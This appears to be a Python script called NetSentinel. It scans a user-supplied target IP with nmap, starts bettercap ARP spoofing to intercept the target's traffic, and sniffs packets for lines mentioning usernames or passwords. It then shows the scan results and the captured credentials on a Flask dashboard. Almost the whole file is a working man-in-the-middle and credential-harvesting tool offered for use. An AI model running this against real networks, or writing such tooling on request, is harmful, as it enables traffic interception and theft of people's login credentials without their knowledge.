import subprocess
import re
import threading
from flask import Flask, render_template
from scapy.all import sniff, Raw

app = Flask(__name__)

# Global data structures to store real-time results
scan_results_global = []
captured_creds_global = []


class NetSentinel:
    """
    Main class for managing network reconnaissance and security operations.
    """

    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.scan_results = []

    def detailed_scan(self):
        """
        Executes Nmap scan using subprocess with aggressive enumeration settings.
        """
        print(f"[*] Initiating deep service enumeration for: {self.target_ip}")
        cmd = ["nmap", "-sV", "-T4", "-F", "--version-light", self.target_ip]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout

    def parse_results(self, nmap_data):
        """
        Parses raw Nmap text output into a structured list for the dashboard.
        """
        print("  Analyzing raw scan data...")
        for line in nmap_data.split("\n"):
            if "/tcp" in line and "open" in line:
                parts = line.split()
                port_info = parts[0]
                service_name = parts[2]
                version_info = " ".join(parts[3:])

                result_entry = {
                    "port": port_info,
                    "service": service_name,
                    "version": version_info
                }
                scan_results_global.append(result_entry)
        return scan_results_global

    def sniff_packets(self, packet):
        """
        Performs Deep Packet Inspection (DPI) to extract sensitive credentials.
        """
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode(errors='ignore')
            keywords = ["user", "pass", "login", "username", "password"]
            if any(word in load.lower() for word in keywords):
                clean_data = load.split("\n")[-1]
                if clean_data not in captured_creds_global:
                    captured_creds_global.append(clean_data)
                    print(f"[!] Credential Captured: {clean_data}")

    def start_mitm(self):
        """
        Automates ARP Spoofing using Bettercap to redirect traffic.
        """
        print(f"[*] Starting MITM redirection for: {self.target_ip}")
        cmd = ["bettercap", "-eval", f"set arp.spoof.targets {self.target_ip}; arp.spoof on; net.sniff on"]
        subprocess.Popen(cmd)


@app.route('/')
def dashboard():
    return render_template('index.html', scan_data=scan_results_global, captured_data=captured_creds_global)


if __name__ == "__main__":
    target = input("Enter the target IP address to analyze: ")
    scanner = NetSentinel(target)

    # 1. Reconnaissance Phase
    raw_output = scanner.detailed_scan()
    scanner.parse_results(raw_output)

    # 2. Start MITM and Flask via Threading
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False)).start()
    scanner.start_mitm()

    # 3. Start Background Sniffing
    print("[*] Dashboard live at http://localhost:5000")
    sniff(prn=scanner.sniff_packets, store=0)